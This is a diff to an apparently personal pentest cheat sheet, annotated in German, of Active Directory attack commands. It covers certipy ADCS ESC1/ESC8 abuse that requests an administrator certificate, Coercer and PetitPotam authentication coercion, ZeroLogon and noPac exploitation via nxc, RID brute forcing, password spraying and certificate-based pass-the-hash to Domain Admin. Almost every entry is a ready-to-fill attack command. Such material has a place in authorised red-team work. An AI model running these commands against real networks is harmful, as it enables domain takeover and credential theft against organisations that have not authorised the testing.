@@ -28,42 +28,54 @@ proxychains -q nxc smb <target_range> -u <user> -p '' -d <domain> --shares
 
 % boris, stage1, quickwins, adcs, certipy, recon, esc, esc8, vulnerable
 ## [S1.2a] certipy - ADCS Recon (vulnerable Templates, ESC1-ESC11)
+UPN noetig: -u user@domain (domain=FQDN). dc_ip = IP.
 ```
-certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout
+certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable -stdout
 ```
 
 % boris, stage1, quickwins, adcs, certipy, bloodhound, esc1, analyse
 ## [S1.2b] certipy - Find fuer BloodHound (ESC1-Analyse, Ly4k Queries)
 ```
-certipy find -u <user>@<domain> -p <password> -target <dc_fqdn> -old-bloodhound
+certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -old-bloodhound
 ```
 
 % boris, stage1, quickwins, adcs, bloodhound, collector, dump, esc1
 ## [S1.2c] bloodhound-python - Dump (Users/Computer fuer ESC1)
+-d domain=FQDN . -dc dc_fqdn=FQDN . -ns dc_ip=IP (DC ist DNS) . -u blank.
 ```
-bloodhound-python -u <user> -p <password> -d <domain> -c all -dc <dc_fqdn> -ns <dc_ip> --zip
+bloodhound-python -u <user> -p '<password>' -d <domain> -c all -dc <dc_fqdn> -ns <dc_ip> --zip
 ```
 
 % boris, stage1, quickwins, adcs, certipy, esc1, san, req, upn
 ## [S1.2d] certipy - ESC1 Cert anfordern (SAN/UPN = Administrator)
+-ca = logischer CA-Name (CN). -target = CA-Host. Bei gepatchtem Env zusaetzlich -sid <victim_sid>.
 ```
-certipy req -u <user>@<domain> -p <password> -ca <ca_name> -target <ca_fqdn> -template <template|ESC1> -upn administrator@<domain>
+certipy req -u <user>@<domain> -p '<password>' -dc-ip <dc_ip> -ca <ca_name> -target <ca_fqdn> -template <template|ESC1> -upn administrator@<domain>
 ```
 
 % boris, stage1, quickwins, adcs, certipy, esc8, relay, kerberosauthentication, web
-## [S1.2e] certipy - ESC8 Relay auf CA Web-Enrollment (KerberosAuthentication)
+## [S1.2e] certipy - ESC8 Relay auf CA Web-Enrollment (certipy 5.x: URL-Schema)
 ```
 certipy relay -target 'http://<ca_fqdn>' -template <template|KerberosAuthentication> -debug
 ```
 
 % boris, stage1, quickwins, coerce, coercer, petitpotam, dc, esc8
 ## [S1.2f] Coercer - DC zur Authentifizierung zwingen (fuer ESC8/Relay)
+-t = Target-DC (IP ok) . -l = Angreifer-IP (lhost).
 ```
-python3 Coercer.py coerce -l <lhost> -t <dc_ip> -u <user> -p <password> -d <domain>
+coercer coerce -l <lhost> -t <dc_ip> -u <user> -p '<password>' -d <domain> -v
+```
+
+% boris, stage1, quickwins, coerce, coerceplus, petitpotam, dc, esc8, nxc
+## [S1.2f-nxc] Coercer.py + nxc coerce_plus (Alternative)
+```
+python3 Coercer.py coerce -l <lhost> -t <dc_ip> -u <user> -p '<password>' -d <domain>
+nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> -M coerce_plus -o LISTENER=<lhost>
 ```
 
 % boris, stage1, quickwins, adcs, certipy, auth, pfx, tgt, hash, pth
 ## [S1.2g] certipy - Auth mit .pfx -> TGT + NT-Hash (Domain Admin)
+User/Domain werden aus dem PFX gelesen. -dc-ip = IP.
 ```
 certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
 ```
@@ -81,27 +93,28 @@ msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <
 ```
 
 % boris, stage1, quickwins, vuln, zerologon, cve-2020-1472, dc, nxc
-## [S1.3c] ZeroLogon CVE-2020-1472 (nxc)
+## [S1.3c] ZeroLogon CVE-2020-1472 (nxc, unauth)
 ```
 nxc smb <dc_ip> -u '' -p '' -M zerologon
 ```
 
-% boris, stage1, quickwins, vuln, nopac, samaccountname, cve-2021-42278, nxc
+% boris, stage1, quickwins, vuln, nopac, samaccountname, cve-2021-42278, nxc, kerberos
 ## [S1.3d] noPac CVE-2021-42278/42287 (nxc)
+nopac laeuft intern ueber Kerberos: bei Fehler dc_fqdn statt dc_ip + DNS/hosts pruefen.
 ```
-nxc smb <dc_ip> -u <user> -p <password> -M nopac
+nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> -M nopac
 ```
 
-% boris, stage1, quickwins, vuln, petitpotam, coerce, cve-2021-36942
-## [S1.3e] PetitPotam - unauth Coercion Check
+% boris, stage1, quickwins, vuln, petitpotam, coerce, cve-2021-36942, unauth
+## [S1.3e] PetitPotam - unauth Coercion Check (Positional: listener target)
 ```
-python3 PetitPotam.py -d <domain> <lhost> <dc_ip>
+python3 PetitPotam.py <lhost> <dc_ip>
 ```
 
 % boris, stage1, quickwins, vuln, printnightmare, spooler, cve-2021-1675, nxc
 ## [S1.3f] PrintNightmare / Spooler Check (nxc)
 ```
-nxc smb <target_range> -u <user> -p <password> -M spooler
+nxc smb <target_range> -u <user> -p '<password>' -d <domain> -M spooler
 ```
 
 % boris, stage1, quickwins, enum, smb, nullsession, shares, passpol, nxc
@@ -117,7 +130,7 @@ nxc smb <dc_ip> -u '' -p '' --rid-brute 5000
 ```
 
 % boris, stage1, quickwins, enum, spray, useraspassword, nxc
-## [S1.4c] nxc - Username = Password Spray
+## [S1.4c] nxc - Username = Password Spray (u/p = Datei, kein Quoting)
 ```
 nxc smb <target_range> -u <users_file|users.txt> -p <users_file|users.txt> --no-bruteforce --continue-on-success
 ```
